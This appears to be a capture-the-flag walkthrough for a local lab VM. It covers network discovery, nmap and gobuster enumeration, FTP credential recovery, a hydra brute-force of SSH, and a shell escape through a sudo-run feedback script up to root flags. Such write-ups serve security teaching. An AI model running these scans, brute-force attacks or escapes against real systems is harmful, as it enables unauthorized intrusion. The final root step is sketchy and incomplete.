Step 1: Finding the Machine on the Network using:

Identifying the target machine's active IP address by scanning the local host-only network interface.

•	Ip a

•	sudo arp-scan --interface=eth1 192.168.56.0/24
<img width="602" height="365" alt="image" src="https://github.com/user-attachments/assets/158a7ba3-5885-4c5d-804d-2b96fd889efa" />
 

Step 2: Recon with Nmap
Conducting an initial port scan against the target IP to discover open ports and determine which network services are running.
•	nmap 192.168.56.103
 


Step 3: Visiting the Website 
Navigating to 192.168.56.103 in the web browser.
Accessing the target's web server on Port 80 to enumerate the web application and look for visible clues or hidden directories.
 

Step 4: Finding Hidden Web Paths
Performing web directory brute-forcing using a medium-sized wordlist to locate hidden directories and unlinked files on the web server.
•	gobuster dir -u http://192.168.56.103 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt







 

Navigating to http://192.168.56.103/hidden_text
 

Qr code appeared when click Thank You

 

Step 5: Cracking the QR Code
Decoded it using an online QR decoder
 

Step 6: FTP Login 
Authenticating to the target's FTP server using the recovered credentials to enumerate the file directory and download files containing potential clues and password wordlists.
Connect use ftp 192.168.56.103
Then you listed files:
•	ls
And downloaded two files:
•	get information.txt
•	get p_lists.txt

 

Read: 
•	cat information.txt
•	cat p_lists.txt
 

 

Step 7: Attacking SSH
Launching a brute-force attack against the SSH service using Hydra to find the valid password for user robin from the downloaded wordlist.
•	hydra -l robin -P p_lists.txt ssh://192.168.56.103
 

Step 8: Logging in as robin
Establishing an interactive remote terminal session via SSH using the cracked credentials to gain initial low-privileged shell access as user robin.
•	ssh robin@192.168.56.103
 

Step 9: Capturing Flags
Listing all hidden files in the home directory to find the initial user flag, and navigating into the project directory to locate files for the next phase.
•	ls -la
•	cd project
 

•	ls
 

•	sudo -l
 

•	ls -la
•	cat user1.txt
and we get the first flag.
 


Step 10: Privilege Escalation Begins
Reviewing the allowed sudo privileges for the current user to find binaries or scripts that can be executed as another user without a password.
•	sudo -l
 

•	cd project
•	ls
•	cat feedback.sh
 

Escaping the feedback script using the 'sh' input vulnerability
•	Enter Your Name : fathanah
•	Enter You Feedback About This Target Machine : sh

Confirming successful horizontal privilege escalation to user: jerry
•	whoami
Stabilizing the simple shell into an interactive TTY bash session
•	python3 -c 'import pty; pty.spawn("/bin/bash")'
Navigating to the new user's home directory
•	cd /home/jerry
Enumerating the directory contents (including hidden files) to locate the flag
•	ls -la
Reading the second flag file
•	cat user2.txt
 

Step 11: Achieving Root Access
Confirming root privileges, navigating to the root user's home directory, and reading the final flag file to successfully complete the target machine exploit.
•	id
 
After 
#
•	Type whoami
•	cd /root
•	ls -la
And when find root.txt files, read it using cat root.txt and we got the last flag
 



